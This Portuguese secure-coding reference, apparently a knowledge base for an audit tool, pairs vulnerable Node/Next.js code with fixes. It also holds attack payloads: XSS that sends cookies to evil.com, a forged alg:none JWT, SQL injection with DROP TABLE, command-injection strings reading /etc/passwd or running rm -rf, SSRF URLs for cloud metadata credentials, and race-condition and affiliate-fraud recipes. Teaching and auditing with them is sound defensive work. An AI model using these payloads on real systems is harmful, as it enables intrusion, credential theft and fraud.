# Referência de Padrões Vulneráveis e Correções

Este documento serve como base de conhecimento detalhada para o AppSec Elite Auditor.
Contém exemplos concretos de código vulnerável, payloads de ataque e correções recomendadas.

---

## 1. JWT — Padrões Vulneráveis e Ataques

### 1.1 Ataque algorithm: none

**Vulnerável:**

```javascript
// Aceita qualquer algoritmo, incluindo 'none'
jwt.verify(token, secret);
// ou pior:
jwt.verify(token, '', { algorithms: ['none'] });
```

**Payload de ataque:**

```
# Token forjado sem assinatura
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

**Correção:**

```javascript
// Sempre especificar algoritmo explícito
jwt.verify(token, secret, { algorithms: ['HS256'] });
```

### 1.2 Confusão RS256 → HS256

**Vulnerável:**

```javascript
// Servidor usa RS256 mas aceita HS256
// Atacante usa a chave PÚBLICA (disponível) como segredo HMAC
jwt.verify(token, publicKey); // sem restringir algoritmo
```

**Correção:**

```javascript
jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // APENAS RS256
```

### 1.3 Segredo Fraco

**Vulnerável:**

```javascript
jwt.sign(payload, 'secret');
jwt.sign(payload, '123456');
jwt.sign(payload, 'my-app-secret');
jwt.sign(payload, process.env.JWT_SECRET); // JWT_SECRET=secret no .env
```

**Ataque — brute force com hashcat:**

```bash
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

**Correção:**

```javascript
// Gerar segredo forte (mínimo 256 bits)
// openssl rand -base64 64
const secret = process.env.JWT_SECRET; // JWT_SECRET=<64+ caracteres aleatórios>
jwt.sign(payload, secret, {
  algorithm: 'HS256',
  expiresIn: '15m', // access token curto
});
```

### 1.4 decode() sem verify()

**Vulnerável:**

```javascript
// decode() NÃO valida a assinatura — qualquer um pode forjar o token
const decoded = jwt.decode(token);
if (decoded.role === 'admin') {
  // concede acesso admin baseado em token não verificado!
}
```

**Correção:**

```javascript
try {
  const verified = jwt.verify(token, secret, { algorithms: ['HS256'] });
  if (verified.role === 'admin') {
    // agora sim, token verificado criptograficamente
  }
} catch (err) {
  return res.status(401).json({ error: 'Token inválido' });
}
```

### 1.5 Manipulação de Claims

**Ataque:**

```json
// Token original
{"sub": "user123", "role": "user", "plan": "free"}

// Token forjado (se segredo fraco ou alg:none)
{"sub": "user123", "role": "admin", "plan": "enterprise"}
```

**Verificação:** Sempre validar claims contra o banco de dados, não confiar cegamente no token.

---

## 2. SQL Injection — Padrões e Payloads

### 2.1 Concatenação Direta

**Vulnerável:**

```javascript
// String concatenation
const users = await db.query(`SELECT * FROM users WHERE email = '${req.body.email}'`);

// Template literal
const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
```

**Payloads de ataque:**

```
' OR '1'='1' --
' UNION SELECT username, password FROM users --
'; DROP TABLE users; --
' OR 1=1; UPDATE users SET role='admin' WHERE email='attacker@evil.com'; --
```

**Correção:**

```javascript
// Parametrizado — seguro
const users = await db.query('SELECT * FROM users WHERE email = $1', [req.body.email]);
```

### 2.2 Prisma — queryRawUnsafe

**Vulnerável:**

```typescript
// $queryRawUnsafe aceita string dinâmica — VULNERÁVEL
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = ${req.params.id}`);
```

**Correção:**

```typescript
// Usar o ORM
await prisma.user.findUnique({ where: { id: req.params.id } });

// Ou $queryRaw com template tagged (parametrizado automaticamente)
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${req.params.id}`;
```

### 2.3 Sequelize — Literal

**Vulnerável:**

```javascript
const users = await User.findAll({
  where: sequelize.literal(`name = '${req.query.name}'`),
});
```

**Correção:**

```javascript
const users = await User.findAll({
  where: { name: req.query.name },
});
```

---

## 3. NoSQL Injection (MongoDB)

### 3.1 Operador Injection

**Vulnerável:**

```javascript
app.post('/login', async (req, res) => {
  const user = await User.findOne(req.body);
  // Body malicioso: { "email": {"$gt": ""}, "password": {"$gt": ""} }
  // Retorna o primeiro usuário do banco!
});
```

**Outros payloads:**

```json
{"email": {"$ne": ""}}
{"email": {"$regex": "admin.*"}}
{"$where": "this.password.length > 0"}
```

**Correção:**

```javascript
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({
    email: String(email), // força tipo string
  });
  // + bcrypt.compare(password, user.passwordHash)
});
```

---

## 4. Command Injection

### 4.1 exec com Input do Usuário

**Vulnerável:**

```javascript
const { exec } = require('child_process');
exec(`convert ${req.body.filename} output.jpg`);
// Payload: "; rm -rf / #" ou "$(cat /etc/passwd)"

exec(`ping -c 3 ${req.query.host}`);
// Payload: "google.com; cat /etc/passwd"
```

**Correção:**

```javascript
const { execFile, spawn } = require('child_process');

// execFile não usa shell
execFile('convert', [req.body.filename, 'output.jpg']);

// spawn sem shell
spawn('ping', ['-c', '3', req.query.host], { shell: false });
```

### 4.2 Python

**Vulnerável:**

```python
import os
os.system(f"convert {filename} output.jpg")

import subprocess
subprocess.call(f"ping -c 3 {host}", shell=True)
```

**Correção:**

```python
import subprocess
subprocess.run(["convert", filename, "output.jpg"], shell=False)
subprocess.run(["ping", "-c", "3", host], shell=False)
```

---

## 5. SSRF — Server-Side Request Forgery

### 5.1 Fetch com URL do Usuário

**Vulnerável:**

```javascript
app.post('/preview', async (req, res) => {
  const response = await fetch(req.body.url);
  const data = await response.text();
  res.json({ preview: data });
});
```

**Payloads de ataque:**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://localhost:6379/
http://127.0.0.1:3306/
http://[::1]:8080/admin
http://0x7f000001/
http://2130706433/ (decimal de 127.0.0.1)
file:///etc/passwd
```

**Correção:**

```javascript
const { URL } = require('url');
const dns = require('dns').promises;

async function isSafeUrl(urlStr) {
  const url = new URL(urlStr);

  // Apenas HTTPS
  if (url.protocol !== 'https:') return false;

  // Bloquear hosts conhecidos
  const blocked = [
    '169.254.169.254',
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '::1',
    'metadata.google.internal',
    '100.100.100.200',
  ];
  if (blocked.includes(url.hostname)) return false;

  // Resolver DNS e verificar se IP é interno
  const { address } = await dns.lookup(url.hostname);
  if (
    address.startsWith('10.') ||
    address.startsWith('172.') ||
    address.startsWith('192.168.') ||
    address.startsWith('127.') ||
    address.startsWith('169.254.')
  )
    return false;

  return true;
}
```

---

## 6. XSS — Cross-Site Scripting

### 6.1 React — dangerouslySetInnerHTML

**Vulnerável:**

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**Payloads:**

```html
<img src=x onerror=alert(document.cookie)>
<svg onload=fetch('https://evil.com/steal?c='+document.cookie)>
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**Correção:**

```jsx
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />;
```

### 6.2 Express — Template Literal

**Vulnerável:**

```javascript
app.get('/search', (req, res) => {
  res.send(`<h1>Resultados para: ${req.query.q}</h1>`);
});
```

**Correção:**

```javascript
import { escape } from 'lodash';
app.get('/search', (req, res) => {
  res.send(`<h1>Resultados para: ${escape(req.query.q)}</h1>`);
});
// Ou melhor: usar template engine com auto-escape (EJS, Handlebars, Pug)
```

---

## 7. IDOR — Insecure Direct Object Reference

### 7.1 Acesso a Recurso de Outro Usuário

**Vulnerável:**

```javascript
// Qualquer usuário autenticado acessa qualquer pedido
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await db.getOrder(req.params.orderId);
  res.json(order);
});
```

**Ataque:**

```
GET /api/orders/1    → meu pedido
GET /api/orders/2    → pedido de outro usuário (IDOR!)
GET /api/orders/3    → pedido de outro usuário (IDOR!)
```

**Correção:**

```javascript
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await db.getOrder(req.params.orderId);
  if (!order || order.userId !== req.user.id) {
    return res.status(404).json({ error: 'Pedido não encontrado' });
  }
  res.json(order);
});

// Ou melhor — filtrar na query:
app.get('/api/orders/:orderId', authenticate, async (req, res) => {
  const order = await prisma.order.findFirst({
    where: {
      id: req.params.orderId,
      userId: req.user.id, // garante ownership
    },
  });
  if (!order) return res.status(404).json({ error: 'Pedido não encontrado' });
  res.json(order);
});
```

### 7.2 Rota Admin sem Verificação de Role

**Vulnerável:**

```javascript
app.get('/admin/users', authenticate, async (req, res) => {
  const users = await db.getAllUsers();
  res.json(users); // qualquer autenticado acessa!
});
```

**Correção:**

```javascript
function requireRole(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Acesso negado' });
    }
    next();
  };
}

app.get('/admin/users', authenticate, requireRole('admin'), async (req, res) => {
  const users = await db.getAllUsers();
  res.json(users);
});
```

---

## 8. Mass Assignment

**Vulnerável:**

```javascript
app.put('/api/user/:id', authenticate, async (req, res) => {
  await prisma.user.update({
    where: { id: req.params.id },
    data: req.body, // atacante envia { isAdmin: true, role: "admin" }
  });
});
```

**Correção:**

```javascript
app.put('/api/user/:id', authenticate, async (req, res) => {
  const { name, email, phone, avatar } = req.body; // whitelist explícita
  await prisma.user.update({
    where: { id: req.params.id },
    data: { name, email, phone, avatar },
  });
});
```

---

## 9. Webhook de Pagamento

### 9.1 Stripe — Sem Verificação

**Vulnerável:**

```javascript
app.post('/webhook/stripe', express.json(), async (req, res) => {
  const event = req.body;
  if (event.type === 'payment_intent.succeeded') {
    await liberarAcesso(event.data.object.metadata.userId);
    // QUALQUER UM pode enviar um POST forjado e liberar acesso!
  }
  res.json({ received: true });
});
```

**Correção:**

```javascript
app.post(
  '/webhook/stripe',
  express.raw({ type: 'application/json' }), // RAW body, não JSON
  async (req, res) => {
    const sig = req.headers['stripe-signature'];
    let event;

    try {
      event = stripe.webhooks.constructEvent(req.body, sig, process.env.STRIPE_WEBHOOK_SECRET);
    } catch (err) {
      console.error('Webhook signature verification failed:', err.message);
      return res.status(400).send(`Webhook Error: ${err.message}`);
    }

    switch (event.type) {
      case 'payment_intent.succeeded':
        await liberarAcesso(event.data.object.metadata.userId);
        break;
      case 'payment_intent.payment_failed':
        await notificarFalhaPagamento(event.data.object.metadata.userId);
        break;
    }

    res.json({ received: true });
  },
);
```

### 9.2 Hotmart

**Vulnerável:**

```javascript
app.post('/webhook/hotmart', async (req, res) => {
  // Sem verificar hottok!
  if (req.body.event === 'PURCHASE_COMPLETE') {
    await liberarAcesso(req.body.data.buyer.email);
  }
});
```

**Correção:**

```javascript
app.post('/webhook/hotmart', async (req, res) => {
  const hottok = req.headers['x-hotmart-hottok'];
  if (hottok !== process.env.HOTMART_HOTTOK) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  if (req.body.event === 'PURCHASE_COMPLETE') {
    // Verificar status diretamente na API da Hotmart antes de liberar
    const verified = await hotmartApi.verifyPurchase(req.body.data.purchase.transaction);
    if (verified.status === 'COMPLETE') {
      await liberarAcesso(req.body.data.buyer.email);
    }
  }
  res.status(200).end();
});
```

---

## 10. Race Conditions

### 10.1 TOC-TOU (Time of Check, Time of Use)

**Vulnerável:**

```javascript
app.post('/redeem-coupon', authenticate, async (req, res) => {
  const coupon = await db.getCoupon(req.body.code);
  if (coupon.uses < coupon.maxUses) {
    // CHECK
    await applyDiscount(req.user.id, coupon); // (tempo passa...)
    await db.incrementCouponUses(coupon.id); // USE — race condition!
  }
});
```

**Ataque — 10 requisições simultâneas:**

```bash
for i in {1..10}; do
  curl -X POST /api/redeem-coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"code": "DESCONTO50"}' &
done
```

**Correção — transação atômica:**

```javascript
app.post('/redeem-coupon', authenticate, async (req, res) => {
  await prisma.$transaction(async (tx) => {
    const coupon = await tx.coupon.findUnique({
      where: { code: req.body.code },
    });

    if (!coupon || coupon.uses >= coupon.maxUses) {
      throw new Error('Cupom inválido ou esgotado');
    }

    await tx.coupon.update({
      where: { id: coupon.id },
      data: { uses: { increment: 1 } },
    });

    await applyDiscount(req.user.id, coupon);
  });

  res.json({ success: true });
});
```

---

## 11. CORS Misconfiguration

**Vulnerável — Origin reflectida:**

```javascript
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin); // reflete TUDO
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});
```

**Vulnerável — Wildcard com credentials:**

```javascript
app.use(cors({ origin: '*', credentials: true }));
```

**Correção:**

```javascript
const allowedOrigins = ['https://seuapp.com', 'https://www.seuapp.com', 'https://app.seuapp.com'];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Blocked by CORS'));
      }
    },
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
  }),
);
```

---

## 12. Sessão — Configuração Segura

**Vulnerável:**

```javascript
app.use(
  session({
    secret: 'meu-segredo',
    cookie: {}, // sem flags de segurança
  }),
);
```

**Correção:**

```javascript
app.use(
  session({
    secret: process.env.SESSION_SECRET, // forte, do ambiente
    name: '__session', // nome não-padrão (não 'connect.sid')
    cookie: {
      httpOnly: true, // previne XSS roubar cookie
      secure: process.env.NODE_ENV === 'production', // só HTTPS em prod
      sameSite: 'strict', // previne CSRF
      maxAge: 15 * 60 * 1000, // 15 minutos
      domain: '.seuapp.com',
    },
    resave: false,
    saveUninitialized: false,
    store: new RedisStore({ client: redisClient }), // não usar MemoryStore em prod
  }),
);
```

---

## 13. Path Traversal em Upload

**Vulnerável:**

```javascript
app.post('/upload', authenticate, async (req, res) => {
  const filename = req.body.filename; // "../../../../etc/passwd"
  fs.writeFileSync(`uploads/${filename}`, req.body.content);
});
```

**Correção:**

```javascript
const path = require('path');

app.post('/upload', authenticate, async (req, res) => {
  const safeName = path.basename(req.body.filename); // remove ../
  const ext = path.extname(safeName).toLowerCase();

  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.webp'];
  if (!allowedExts.includes(ext)) {
    return res.status(400).json({ error: 'Tipo de arquivo não permitido' });
  }

  const maxSize = 5 * 1024 * 1024; // 5MB
  if (req.body.content.length > maxSize) {
    return res.status(400).json({ error: 'Arquivo muito grande' });
  }

  const uploadDir = path.resolve(__dirname, 'uploads');
  const fullPath = path.join(uploadDir, safeName);

  // Verificar que o caminho final está dentro do diretório de uploads
  if (!fullPath.startsWith(uploadDir)) {
    return res.status(400).json({ error: 'Caminho inválido' });
  }

  fs.writeFileSync(fullPath, req.body.content);
  res.json({ filename: safeName });
});
```

---

## 14. Vazamento de Informações Sensíveis no Response

**Vulnerável:**

```javascript
app.get('/api/users/:id', authenticate, async (req, res) => {
  const user = await prisma.user.findUnique({ where: { id: req.params.id } });
  res.json(user); // envia passwordHash, resetToken, secretKey...
});
```

**Correção:**

```javascript
app.get('/api/users/:id', authenticate, async (req, res) => {
  const user = await prisma.user.findUnique({
    where: { id: req.params.id },
    select: {
      id: true,
      name: true,
      email: true,
      avatar: true,
      createdAt: true,
      // NÃO incluir: passwordHash, resetToken, secretKey
    },
  });
  res.json(user);
});
```

---

## 15. Next.js — Vulnerabilidades Específicas

### 15.1 Middleware Bypass

**Vulnerável:**

```typescript
// middleware.ts
export function middleware(request: NextRequest) {
  // Protege apenas /dashboard
  if (request.nextUrl.pathname.startsWith('/dashboard')) {
    const token = request.cookies.get('token');
    if (!token) return NextResponse.redirect(new URL('/login', request.url));
  }
}
// MAS /api/admin/* não está protegido pelo middleware!
```

**Correção:**

```typescript
export function middleware(request: NextRequest) {
  const protectedPaths = ['/dashboard', '/admin', '/api/admin', '/api/private'];
  const isProtected = protectedPaths.some((p) => request.nextUrl.pathname.startsWith(p));

  if (isProtected) {
    const token = request.cookies.get('token');
    if (!token) {
      if (request.nextUrl.pathname.startsWith('/api/')) {
        return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
      }
      return NextResponse.redirect(new URL('/login', request.url));
    }
  }
}

export const config = {
  matcher: ['/dashboard/:path*', '/admin/:path*', '/api/admin/:path*', '/api/private/:path*'],
};
```

### 15.2 NEXT*PUBLIC* com Secrets

**CRÍTICO — chaves expostas no bundle do cliente:**

```env
# ❌ NUNCA
NEXT_PUBLIC_STRIPE_SECRET_KEY=sk_live_...
NEXT_PUBLIC_DATABASE_URL=postgresql://...
NEXT_PUBLIC_JWT_SECRET=...
NEXT_PUBLIC_AWS_SECRET_KEY=...

# ✅ Correto
STRIPE_SECRET_KEY=sk_live_...     # só servidor
DATABASE_URL=postgresql://...      # só servidor
JWT_SECRET=...                     # só servidor
NEXT_PUBLIC_STRIPE_KEY=pk_live_... # chave pública OK
NEXT_PUBLIC_APP_URL=https://...    # informação pública OK
```

### 15.3 API Route sem Autenticação

**Vulnerável:**

```typescript
// app/api/users/route.ts
export async function GET() {
  const users = await prisma.user.findMany();
  return Response.json(users); // qualquer um acessa!
}
```

**Correção:**

```typescript
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';

export async function GET() {
  const session = await getServerSession(authOptions);
  if (!session || session.user.role !== 'admin') {
    return Response.json({ error: 'Unauthorized' }, { status: 403 });
  }
  const users = await prisma.user.findMany({
    select: { id: true, name: true, email: true },
  });
  return Response.json(users);
}
```

---

## 16. Referências OWASP

| Código   | Nome                        | Relevância                                     |
| -------- | --------------------------- | ---------------------------------------------- |
| A01:2021 | Broken Access Control       | IDOR, privilege escalation, CORS               |
| A02:2021 | Cryptographic Failures      | JWT fraco, secrets expostos, HTTP sem TLS      |
| A03:2021 | Injection                   | SQLi, NoSQLi, Command Injection, SSTI, XSS     |
| A04:2021 | Insecure Design             | Lógica de negócio, race conditions             |
| A05:2021 | Security Misconfiguration   | CORS, headers, debug mode, default credentials |
| A06:2021 | Vulnerable Components       | npm audit, dependências desatualizadas         |
| A07:2021 | Auth Failures               | JWT, sessão, brute force, credential stuffing  |
| A08:2021 | Software/Data Integrity     | Webhook sem verificação, CI/CD poisoning       |
| A09:2021 | Logging/Monitoring Failures | Sem logs de auditoria                          |
| A10:2021 | SSRF                        | Fetch com URL do usuário sem validação         |

---

## 17. Race Condition Avançada — Multi-Item Financeiro

### 17.1 Compra Simultânea de Itens Diferentes

**Vulnerável:**

```javascript
app.post('/api/purchase/:courseId', authenticate, async (req, res) => {
  const user = await prisma.user.findUnique({ where: { id: req.user.id } });
  const course = await prisma.course.findUnique({ where: { id: req.params.courseId } });

  // Verifica se já comprou ESTE curso (ok)
  const existing = await prisma.enrollment.findFirst({
    where: { userId: req.user.id, courseId: course.id },
  });
  if (existing) return res.status(400).json({ error: 'Já comprado' });

  // Verifica saldo (VULNERÁVEL — leitura sem lock)
  if (user.balance < course.price) {
    return res.status(400).json({ error: 'Saldo insuficiente' });
  }

  // Debita saldo (VULNERÁVEL — escrita sem atomicidade)
  await prisma.user.update({
    where: { id: req.user.id },
    data: { balance: user.balance - course.price },
  });

  await prisma.enrollment.create({
    data: { userId: req.user.id, courseId: course.id },
  });

  res.json({ success: true });
});
```

**Ataque — comprar 3 cursos de R$30 com saldo de R$50:**

```bash
# Todas as 3 requisições veem saldo = 50 e aprovam
curl -X POST /api/purchase/curso-A -H "Authorization: Bearer $TOKEN" &
curl -X POST /api/purchase/curso-B -H "Authorization: Bearer $TOKEN" &
curl -X POST /api/purchase/curso-C -H "Authorization: Bearer $TOKEN" &
wait
# Resultado: 3 cursos comprados, saldo = 50 - 30 = 20 (só debitou um!)
```

**Correção — transação com lock:**

```javascript
app.post('/api/purchase/:courseId', authenticate, async (req, res) => {
  try {
    await prisma.$transaction(async (tx) => {
      // Lock na linha do usuário para evitar leitura concorrente
      const [user] = await tx.$queryRaw`
        SELECT * FROM "User" WHERE id = ${req.user.id} FOR UPDATE
      `;

      const course = await tx.course.findUnique({ where: { id: req.params.courseId } });
      if (!course) throw new Error('Curso não encontrado');

      const existing = await tx.enrollment.findFirst({
        where: { userId: req.user.id, courseId: course.id },
      });
      if (existing) throw new Error('Já comprado');

      if (user.balance < course.price) throw new Error('Saldo insuficiente');

      // Atualização atômica do saldo
      await tx.user.update({
        where: { id: req.user.id },
        data: { balance: { decrement: course.price } },
      });

      await tx.enrollment.create({
        data: { userId: req.user.id, courseId: course.id },
      });
    });

    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});
```

### 17.2 Reembolso Duplo com Race Condition

**Vulnerável:**

```javascript
app.post('/api/refund/:enrollmentId', authenticate, async (req, res) => {
  const enrollment = await prisma.enrollment.findFirst({
    where: { id: req.params.enrollmentId, userId: req.user.id },
  });

  if (!enrollment || enrollment.refunded) {
    return res.status(400).json({ error: 'Inválido' });
  }

  // VULNERÁVEL: check e update separados
  await prisma.enrollment.update({
    where: { id: enrollment.id },
    data: { refunded: true },
  });

  await prisma.user.update({
    where: { id: req.user.id },
    data: { balance: { increment: enrollment.price } },
  });

  res.json({ success: true });
});
```

**Correção:**

```javascript
app.post('/api/refund/:enrollmentId', authenticate, async (req, res) => {
  try {
    await prisma.$transaction(async (tx) => {
      // Atualizar APENAS se não foi reembolsado (atômico)
      const updated = await tx.enrollment.updateMany({
        where: {
          id: req.params.enrollmentId,
          userId: req.user.id,
          refunded: false, // condição atômica
        },
        data: { refunded: true },
      });

      if (updated.count === 0) throw new Error('Já reembolsado ou inválido');

      const enrollment = await tx.enrollment.findUnique({
        where: { id: req.params.enrollmentId },
      });

      await tx.user.update({
        where: { id: req.user.id },
        data: { balance: { increment: enrollment.price } },
      });
    });

    res.json({ success: true });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});
```

---

## 18. URL/Image Tracker Injection

### 18.1 Injeção de Imagem Externa como Tracker

**Vulnerável:**

```javascript
app.put('/api/posts/:id', authenticate, async (req, res) => {
  const { content, imageUrl } = req.body;
  // Aceita qualquer URL de imagem — permite tracker externo
  await prisma.post.update({
    where: { id: req.params.id },
    data: { content, imageUrl },
  });
  res.json({ success: true });
});
```

**Ataque:**

```json
{
  "content": "Post normal",
  "imageUrl": "https://evil-tracker.com/pixel.gif?target=victim123"
}
```

Quando qualquer usuário visualizar o post, o navegador carrega a imagem e revela
o IP da vítima para o servidor do atacante.

**Correção:**

```javascript
const ALLOWED_IMAGE_DOMAINS = ['storage.seuapp.com', 'cdn.seuapp.com', 'res.cloudinary.com/seuapp'];

function isAllowedImageUrl(url) {
  try {
    const parsed = new URL(url);
    return ALLOWED_IMAGE_DOMAINS.some((domain) => parsed.hostname.endsWith(domain));
  } catch {
    return false;
  }
}

app.put('/api/posts/:id', authenticate, async (req, res) => {
  const { content, imageUrl } = req.body;

  if (imageUrl && !isAllowedImageUrl(imageUrl)) {
    return res.status(400).json({ error: 'URL de imagem não permitida' });
  }

  await prisma.post.update({
    where: { id: req.params.id },
    data: { content, imageUrl },
  });
  res.json({ success: true });
});
```

**CSP adicional no header:**

```
Content-Security-Policy: img-src 'self' storage.seuapp.com cdn.seuapp.com;
```

---

## 19. DoS por Armazenamento (Input Size Abuse)

### 19.1 Campos Sem Limite de Tamanho

**Vulnerável:**

```javascript
app.post('/api/comments', authenticate, async (req, res) => {
  // Sem limite — atacante envia 10MB de texto
  await prisma.comment.create({
    data: {
      text: req.body.text, // sem validação de tamanho
      userId: req.user.id,
      postId: req.body.postId,
    },
  });
  res.json({ success: true });
});
```

**Ataque:**

```bash
# Gerar payload de 10MB e enviar
python3 -c "print('A' * 10_000_000)" | curl -X POST /api/comments \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"text\": \"$(python3 -c "print('A' * 10_000_000)")\", \"postId\": \"123\"}"
```

**Correção:**

```javascript
// 1. Limite global de body
app.use(express.json({ limit: '1mb' }));

// 2. Validação por campo
app.post('/api/comments', authenticate, async (req, res) => {
  const { text, postId } = req.body;

  if (!text || text.length > 5000) {
    return res.status(400).json({ error: 'Comentário muito longo (máx 5000 caracteres)' });
  }

  await prisma.comment.create({
    data: { text, userId: req.user.id, postId },
  });
  res.json({ success: true });
});
```

---

## 20. Fraude em Sistema de Afiliados

### 20.1 Auto-Referência + Reembolso = Dinheiro Infinito

**Cenário de ataque completo:**

```
1. Atacante se cadastra como afiliado do Curso X (comissão 30%)
2. Atacante compra Curso X usando próprio link de afiliado (R$100)
3. Sistema gera comissão de R$30 para o atacante (afiliado)
4. Atacante solicita saque da comissão (R$30 liberado)
5. Atacante solicita reembolso dentro do prazo (R$100 devolvido)
6. Resultado: atacante lucrou R$30 sem gastar nada
7. Repetir infinitamente
```

**Vulnerável:**

```javascript
// Webhook de compra — gera comissão imediatamente
app.post('/webhook/purchase', async (req, res) => {
  const { buyerId, courseId, affiliateId, amount } = req.body;

  // Cria enrollment
  await prisma.enrollment.create({ data: { userId: buyerId, courseId } });

  // Gera comissão IMEDIATAMENTE (VULNERÁVEL)
  if (affiliateId) {
    await prisma.commission.create({
      data: {
        affiliateId,
        amount: amount * 0.3,
        status: 'AVAILABLE', // já disponível para saque!
      },
    });
  }

  res.json({ ok: true });
});
```

**Correção:**

```javascript
app.post('/webhook/purchase', async (req, res) => {
  const { buyerId, courseId, affiliateId, amount } = req.body;

  // Bloquear auto-referência
  if (affiliateId === buyerId) {
    console.warn(`Auto-referência detectada: user ${buyerId}`);
    // Não gerar comissão
    await prisma.enrollment.create({ data: { userId: buyerId, courseId } });
    return res.json({ ok: true });
  }

  await prisma.enrollment.create({ data: { userId: buyerId, courseId } });

  if (affiliateId) {
    await prisma.commission.create({
      data: {
        affiliateId,
        purchaseId: purchase.id,
        amount: amount * 0.3,
        status: 'PENDING', // NÃO disponível imediatamente
        availableAt: new Date( // Só disponível após período de reembolso
          Date.now() + 30 * 24 * 60 * 60 * 1000, // 30 dias
        ),
      },
    });
  }

  res.json({ ok: true });
});

// Cancelar comissão em caso de reembolso
app.post('/webhook/refund', async (req, res) => {
  const { purchaseId } = req.body;

  await prisma.commission.updateMany({
    where: { purchaseId, status: { in: ['PENDING', 'AVAILABLE'] } },
    data: { status: 'CANCELLED' },
  });

  // ... processar reembolso
});
```

---

## 21. Secrets Vazados por IA em Git History

### 21.1 Padrões Comuns de Vazamento

A IA frequentemente commita secrets quando:

- Tenta resolver erros de deploy colocando valores diretamente no código
- Cria arquivos de configuração com credenciais de exemplo reais
- Não cria `.gitignore` antes do primeiro commit

**Comandos de detecção:**

```bash
# Buscar qualquer .env commitado na história
git log --all --full-history -- "*.env" ".env*"

# Buscar secrets específicos em todo o histórico
git log --all -p -S "sk_live_" --since="1 year ago"
git log --all -p -S "AKIA" --since="1 year ago"
git log --all -p -S "password" -- "*.json" "*.yml" "*.yaml" "*.toml"

# Verificar se .gitignore existia no primeiro commit
git log --reverse --format="%H" -- ".gitignore" | head -1
git log --reverse --format="%H" -- ".env" | head -1
# Se .env foi commitado ANTES do .gitignore → CRÍTICO
```

**Se secrets foram encontrados no histórico, a correção NÃO é apenas deletar o arquivo.**
É necessário:

1. Rotacionar TODAS as chaves expostas imediatamente
2. Usar `git filter-branch` ou `BFG Repo Cleaner` para remover do histórico
3. Force push (com cuidado) para limpar o remote

---

## 22. Supabase — Vulnerabilidades Específicas

### 22.1 RLS Mal Configurado

**Vulnerável:**

```sql
-- RLS habilitado mas sem políticas = ninguém acessa
-- Ou pior: política permissiva demais
CREATE POLICY "allow_all" ON courses FOR ALL USING (true);
```

**Correção:**

```sql
-- Política restritiva: só o dono pode modificar
CREATE POLICY "owner_only" ON courses
  FOR ALL
  USING (auth.uid() = user_id)
  WITH CHECK (auth.uid() = user_id);

-- Leitura pública, escrita restrita
CREATE POLICY "public_read" ON courses FOR SELECT USING (true);
CREATE POLICY "owner_write" ON courses FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "owner_update" ON courses FOR UPDATE USING (auth.uid() = user_id);
CREATE POLICY "owner_delete" ON courses FOR DELETE USING (auth.uid() = user_id);
```

### 22.2 URL de Imagem com Query String Bypass

**Vulnerável:**

```javascript
// Valida que URL é do domínio Supabase, mas não valida tamanho
function isValidImageUrl(url) {
  return url.startsWith('https://supabase.storage.com/my-bucket/');
}

// Atacante adiciona query string gigante:
// https://supabase.storage.com/my-bucket/img.jpg?padding=AAAAAA....(100KB)
```

**Correção:**

```javascript
function isValidImageUrl(url) {
  try {
    const parsed = new URL(url);
    if (!parsed.hostname.endsWith('supabase.co')) return false;
    if (url.length > 500) return false; // URL não precisa ser maior que isso
    return true;
  } catch {
    return false;
  }
}
```
